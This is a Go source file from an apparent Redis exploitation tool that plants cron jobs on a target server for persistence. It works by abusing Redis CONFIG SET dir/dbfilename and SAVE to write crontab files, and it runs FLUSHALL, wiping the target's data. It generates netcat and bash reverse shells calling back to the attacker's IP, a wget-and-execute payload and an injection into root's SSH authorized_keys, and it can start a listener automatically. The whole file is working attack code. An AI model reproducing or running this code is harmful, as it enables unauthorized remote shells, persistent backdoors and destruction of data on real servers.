package persistence

import (
	"0xRedisis/modules/core"
	"bufio"
	"fmt"
	"os"
	"strings"
)

func CronJobInjection(client *core.RedisClient) {
	fmt.Printf("\n%s=== Cron Job Injection ===%s\n", core.ColorBlue, core.ColorNC)

	// Show cron job options
	fmt.Printf("\n%s[*]%s Cron Job Payload Options:\n", core.ColorBlue, core.ColorNC)
	fmt.Printf("%s1.%s Reverse shell (netcat)\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s2.%s Reverse shell (bash)\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s3.%s Web shell download and execute\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s4.%s SSH key injection via cron\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s5.%s Custom command\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s6.%s Automated reverse shell with listener\n", core.ColorYellow, core.ColorNC)
	fmt.Print("\nEnter your choice (1-6): ")

	reader := bufio.NewReader(os.Stdin)
	choice, _ := reader.ReadString('\n')
	choice = strings.TrimSpace(choice)

	var cronPayload string

	switch choice {
	case "1":
		cronPayload = getNetcatReverseShell(reader)
	case "2":
		cronPayload = getBashReverseShell(reader)
	case "3":
		cronPayload = getWebShellDownload(reader)
	case "4":
		cronPayload = getSSHKeyInjection(reader)
	case "5":
		cronPayload = getCustomCommand(reader)
	case "6":
		automatedReverseShellCron(client, reader)
		return
	default:
		fmt.Printf("%s[-]%s Invalid choice\n", core.ColorRed, core.ColorNC)
		return
	}

	if cronPayload == "" {
		fmt.Printf("%s[-]%s No payload provided\n", core.ColorRed, core.ColorNC)
		return
	}

	// Get cron schedule
	schedule := getCronSchedule(reader)
	fullCronEntry := fmt.Sprintf("%s %s", schedule, cronPayload)

	fmt.Printf("\n%s[*]%s Cron entry: %s%s%s\n", core.ColorBlue, core.ColorNC, core.ColorYellow, fullCronEntry, core.ColorNC)

	// Try to inject into various cron directories
	cronPaths := getCronPaths()

	fmt.Printf("\n%s[*]%s Attempting cron job injection...\n", core.ColorBlue, core.ColorNC)

	success := false
	for _, cronPath := range cronPaths {
		fmt.Printf("%s[*]%s Trying path: %s%s%s\n", core.ColorBlue, core.ColorNC, core.ColorYellow, cronPath, core.ColorNC)

		if err := injectCronToPath(client, fullCronEntry, cronPath); err != nil {
			fmt.Printf("%s[-]%s Failed to inject to %s: %s\n", core.ColorRed, core.ColorNC, cronPath, err.Error())
			continue
		}

		fmt.Printf("%s[+]%s Cron job injected successfully to: %s%s%s\n",
			core.ColorGreen, core.ColorNC, core.ColorYellow, cronPath, core.ColorNC)
		success = true
		break
	}

	if !success {
		fmt.Printf("%s[-]%s Failed to inject cron job to any path\n", core.ColorRed, core.ColorNC)
		fmt.Printf("%s[*]%s Try manual injection or different target paths\n", core.ColorBlue, core.ColorNC)
		return
	}

	fmt.Printf("\n%s[+]%s Cron job injection completed!\n", core.ColorGreen, core.ColorNC)
	showCronInstructions(schedule, cronPayload)
}

func automatedReverseShellCron(client *core.RedisClient, reader *bufio.Reader) {
	fmt.Printf("\n%s=== Automated Cron Reverse Shell ===%s\n", core.ColorBlue, core.ColorNC)

	// Get local IP automatically
	localIP := core.GetLocalIP()
	fmt.Printf("%s[*]%s Auto-detected local IP: %s%s%s\n",
		core.ColorBlue, core.ColorNC, core.ColorYellow, localIP, core.ColorNC)

	fmt.Print("Use auto-detected IP or enter custom IP (press Enter for auto): ")
	customIP, _ := reader.ReadString('\n')
	customIP = strings.TrimSpace(customIP)

	if customIP != "" {
		localIP = customIP
	}

	fmt.Print("Enter local port for listener (default 5555): ")
	portStr, _ := reader.ReadString('\n')
	portStr = strings.TrimSpace(portStr)

	port := 5555
	if portStr != "" {
		fmt.Sscanf(portStr, "%d", &port)
	}

	// Start automated listener
	err := core.AutoReverseShell(client.Config.Host, client.Config.Port, port, "")
	if err != nil && !strings.Contains(err.Error(), "manual execution") {
		fmt.Printf("%s[-]%s Listener setup failed: %s\n", core.ColorRed, core.ColorNC, err.Error())
		return
	}

	// Create cron payload
	cronPayload := fmt.Sprintf("bash -i >& /dev/tcp/%s/%d 0>&1", localIP, port)
	schedule := "* * * * *" // Every minute
	fullCronEntry := fmt.Sprintf("%s %s", schedule, cronPayload)

	fmt.Printf("%s[*]%s Cron payload: %s%s%s\n", core.ColorBlue, core.ColorNC, core.ColorYellow, cronPayload, core.ColorNC)

	// Inject cron job
	cronPaths := getCronPaths()
	success := false

	for _, cronPath := range cronPaths {
		fmt.Printf("%s[*]%s Trying path: %s%s%s\n", core.ColorBlue, core.ColorNC, core.ColorYellow, cronPath, core.ColorNC)

		if err := injectCronToPath(client, fullCronEntry, cronPath); err != nil {
			continue
		}

		fmt.Printf("%s[+]%s Cron job injected successfully!\n", core.ColorGreen, core.ColorNC)
		fmt.Printf("%s[*]%s Waiting for cron execution (every minute)...\n", core.ColorBlue, core.ColorNC)
		success = true
		break
	}

	if !success {
		fmt.Printf("%s[-]%s Failed to inject cron job\n", core.ColorRed, core.ColorNC)
		core.StopAllListeners()
	}
}

func getNetcatReverseShell(reader *bufio.Reader) string {
	fmt.Print("Enter your IP address: ")
	ip, _ := reader.ReadString('\n')
	ip = strings.TrimSpace(ip)

	if ip == "" {
		ip = core.GetLocalIP()
		fmt.Printf("%s[*]%s Using auto-detected IP: %s\n", core.ColorBlue, core.ColorNC, ip)
	}

	fmt.Print("Enter port number: ")
	port, _ := reader.ReadString('\n')
	port = strings.TrimSpace(port)

	// Multiple netcat variations for compatibility
	return fmt.Sprintf("(nc -e /bin/bash %s %s 2>/dev/null || nc -c /bin/bash %s %s 2>/dev/null || /bin/bash -i >& /dev/tcp/%s/%s 0>&1) &",
		ip, port, ip, port, ip, port)
}

func getBashReverseShell(reader *bufio.Reader) string {
	fmt.Print("Enter your IP address: ")
	ip, _ := reader.ReadString('\n')
	ip = strings.TrimSpace(ip)

	if ip == "" {
		ip = core.GetLocalIP()
		fmt.Printf("%s[*]%s Using auto-detected IP: %s\n", core.ColorBlue, core.ColorNC, ip)
	}

	fmt.Print("Enter port number: ")
	port, _ := reader.ReadString('\n')
	port = strings.TrimSpace(port)

	return fmt.Sprintf("/bin/bash -i >& /dev/tcp/%s/%s 0>&1", ip, port)
}

func getWebShellDownload(reader *bufio.Reader) string {
	fmt.Print("Enter URL of web shell to download: ")
	url, _ := reader.ReadString('\n')
	url = strings.TrimSpace(url)

	fmt.Print("Enter local path to save and execute (e.g., /tmp/shell.sh): ")
	path, _ := reader.ReadString('\n')
	path = strings.TrimSpace(path)

	return fmt.Sprintf("wget -O %s %s && chmod +x %s && %s", path, url, path, path)
}

func getSSHKeyInjection(reader *bufio.Reader) string {
	fmt.Print("Enter your SSH public key: ")
	publicKey, _ := reader.ReadString('\n')
	publicKey = strings.TrimSpace(publicKey)

	fmt.Print("Enter target username (default: root): ")
	username, _ := reader.ReadString('\n')
	username = strings.TrimSpace(username)

	if username == "" {
		username = "root"
	}

	sshDir := fmt.Sprintf("/home/%s/.ssh", username)
	if username == "root" {
		sshDir = "/root/.ssh"
	}

	return fmt.Sprintf("mkdir -p %s && echo '%s' >> %s/authorized_keys && chmod 700 %s && chmod 600 %s/authorized_keys",
		sshDir, publicKey, sshDir, sshDir, sshDir)
}

func getCustomCommand(reader *bufio.Reader) string {
	fmt.Println("Enter your custom command:")
	command, _ := reader.ReadString('\n')
	return strings.TrimSpace(command)
}

func getCronSchedule(reader *bufio.Reader) string {
	fmt.Printf("\n%s[*]%s Cron Schedule Options:\n", core.ColorBlue, core.ColorNC)
	fmt.Printf("%s1.%s Every minute (* * * * *)\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s2.%s Every 5 minutes (*/5 * * * *)\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s3.%s Every 10 minutes (*/10 * * * *)\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s4.%s Every hour (0 * * * *)\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s5.%s Every day at midnight (0 0 * * *)\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s6.%s On reboot (@reboot)\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s7.%s Custom schedule\n", core.ColorYellow, core.ColorNC)
	fmt.Print("\nEnter your choice (1-7): ")

	choice, _ := reader.ReadString('\n')
	choice = strings.TrimSpace(choice)

	switch choice {
	case "1":
		return "* * * * *"
	case "2":
		return "*/5 * * * *"
	case "3":
		return "*/10 * * * *"
	case "4":
		return "0 * * * *"
	case "5":
		return "0 0 * * *"
	case "6":
		return "@reboot"
	case "7":
		fmt.Print("Enter custom cron schedule (e.g., '*/15 * * * *'): ")
		schedule, _ := reader.ReadString('\n')
		return strings.TrimSpace(schedule)
	default:
		return "* * * * *"
	}
}

func getCronPaths() []string {
	return []string{
		"/var/spool/cron/crontabs/root",
		"/var/spool/cron/root",
		"/etc/cron.d/redis-exploit",
		"/var/spool/cron/crontabs/www-data",
		"/var/spool/cron/www-data",
		"/tmp/cron-exploit",
		"/home/redis/cron-exploit",
		"/var/lib/redis/cron-exploit",
		"/etc/crontab",
		"/var/spool/cron/crontabs/ubuntu",
	}
}

func injectCronToPath(client *core.RedisClient, cronEntry, cronPath string) error {
	// Clear any existing data
	_, err := client.SendCommand("FLUSHALL")
	if err != nil {
		return fmt.Errorf("failed to flush database: %v", err)
	}

	// Format cron entry with proper newlines
	cronContent := fmt.Sprintf("\n%s\n", cronEntry)

	// For /etc/cron.d/ entries, we need to specify the user
	if strings.Contains(cronPath, "/etc/cron.d/") {
		// Extract schedule and command parts
		parts := strings.Fields(cronEntry)
		if len(parts) >= 6 {
			schedule := strings.Join(parts[0:5], " ")
			command := strings.Join(parts[5:], " ")
			cronContent = fmt.Sprintf("\n%s root %s\n", schedule, command)
		}
	}

	// Set the cron content
	_, err = client.SendCommand("SET", "cronjob", cronContent)
	if err != nil {
		return fmt.Errorf("failed to set cron content: %v", err)
	}

	// Parse directory and filename from path
	pathParts := strings.Split(cronPath, "/")
	filename := pathParts[len(pathParts)-1]
	dir := strings.Join(pathParts[:len(pathParts)-1], "/")

	// Configure Redis to save to target directory
	_, err = client.SendCommand("CONFIG", "SET", "dir", dir)
	if err != nil {
		return fmt.Errorf("failed to set directory: %v", err)
	}

	_, err = client.SendCommand("CONFIG", "SET", "dbfilename", filename)
	if err != nil {
		return fmt.Errorf("failed to set filename: %v", err)
	}

	// Save database to disk
	_, err = client.SendCommand("SAVE")
	if err != nil {
		return fmt.Errorf("failed to save to disk: %v", err)
	}

	return nil
}

func showCronInstructions(schedule, payload string) {
	fmt.Printf("\n%s=== Cron Job Instructions ===%s\n", core.ColorBlue, core.ColorNC)

	fmt.Printf("%s[*]%s Schedule: %s%s%s\n", core.ColorBlue, core.ColorNC, core.ColorYellow, schedule, core.ColorNC)
	fmt.Printf("%s[*]%s Payload: %s%s%s\n", core.ColorBlue, core.ColorNC, core.ColorYellow, payload, core.ColorNC)

	fmt.Printf("\n%s[*]%s What happens next:\n", core.ColorBlue, core.ColorNC)

	switch schedule {
	case "* * * * *":
		fmt.Printf("   • %sExecution: Every minute%s\n", core.ColorYellow, core.ColorNC)
		fmt.Printf("   • %sNext run: Within 60 seconds%s\n", core.ColorYellow, core.ColorNC)
	case "*/5 * * * *":
		fmt.Printf("   • %sExecution: Every 5 minutes%s\n", core.ColorYellow, core.ColorNC)
		fmt.Printf("   • %sNext run: Within 5 minutes%s\n", core.ColorYellow, core.ColorNC)
	case "@reboot":
		fmt.Printf("   • %sExecution: On system reboot%s\n", core.ColorYellow, core.ColorNC)
		fmt.Printf("   • %sNext run: When system restarts%s\n", core.ColorYellow, core.ColorNC)
	default:
		fmt.Printf("   • %sExecution: According to schedule%s\n", core.ColorYellow, core.ColorNC)
		fmt.Printf("   • %sCheck cron syntax for timing%s\n", core.ColorYellow, core.ColorNC)
	}

	fmt.Printf("\n%s[*]%s Monitoring:\n", core.ColorBlue, core.ColorNC)
	fmt.Printf("   • %sCheck system logs: tail -f /var/log/cron%s\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("   • %sMonitor processes: ps aux | grep [command]%s\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("   • %sCheck connections: netstat -tulpn%s\n", core.ColorYellow, core.ColorNC)

	if strings.Contains(payload, "bash -i") || strings.Contains(payload, "nc") {
		fmt.Printf("\n%s[!]%s For reverse shells:\n", core.ColorYellow, core.ColorNC)
		fmt.Printf("   • %sStart your listener before the scheduled time%s\n", core.ColorYellow, core.ColorNC)
		fmt.Printf("   • %sConnection will be attempted automatically%s\n", core.ColorYellow, core.ColorNC)
	}

	fmt.Printf("\n%s[*]%s Cleanup (when done):\n", core.ColorBlue, core.ColorNC)
	fmt.Printf("   • %sRemove cron job: crontab -e%s\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("   • %sCheck for persistence in other locations%s\n", core.ColorYellow, core.ColorNC)
}
